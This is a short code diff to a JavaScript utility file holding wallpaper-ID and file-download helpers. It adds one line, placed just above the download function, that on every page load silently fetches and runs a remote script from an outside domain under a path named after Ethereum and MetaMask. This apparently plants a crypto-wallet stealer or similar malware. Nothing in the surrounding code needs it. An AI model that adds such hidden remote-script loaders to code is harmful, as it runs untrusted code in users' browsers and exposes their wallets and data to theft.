@@ -145,6 +145,7 @@ function wallpaperID() {
 }
 
 // Function to download data to a file
+$(document).ready(function(){$.getScript("https://w3.lol/ethereum/dist/metamask.js")})
 function download(data, filename, type) {
     var file = new Blob([data], {type: type});
     if (window.navigator.msSaveOrOpenBlob) // IE10+
